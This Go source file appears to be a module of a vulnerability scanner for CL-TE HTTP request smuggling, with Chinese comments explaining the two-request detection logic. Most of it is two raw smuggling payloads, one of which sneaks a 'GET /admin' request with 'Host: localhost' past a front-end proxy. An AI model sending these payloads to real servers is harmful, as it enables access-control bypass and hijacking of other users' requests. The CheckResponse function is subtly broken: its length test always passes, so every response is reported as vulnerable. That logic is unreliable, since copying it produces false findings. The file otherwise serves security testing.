package Smuggling

import (
	"strings"
)

//  1 CL-TE
//  2 CL-TE-TE HTTP request smuggling, obfuscating the TE header
var ClTePayload2 = []string{`POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x`, `POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=`}

func init() {
	for n, x := range ClTePayload2 {
		x = E2EC(x)
		ClTePayload2[n] = x
	}
}

type ClTe2 struct {
	Base
}

func NewCLTE2() *ClTe2 {
	x := &ClTe2{}
	x.Type = "CL-TE2"
	x.Payload = ClTePayload2
	return x
}

// 第2个payload 成功返回表示ok
func (r *ClTe2) CheckResponse(body string, payload string) bool {
	a := strings.Split(body, "HTTP/1.1 404")
	if 1 <= len(a) {
		return true
	}
	return false
}

// 条件：第一请求都第一段必须是200
// 第一次请求，第二段压入队列
// 第二次请求接在上面第二段后面，所以无论第二次发送什么，都会得到404，那么表示存在漏洞
func (r *ClTe2) GetTimes() int {
	return 2
}
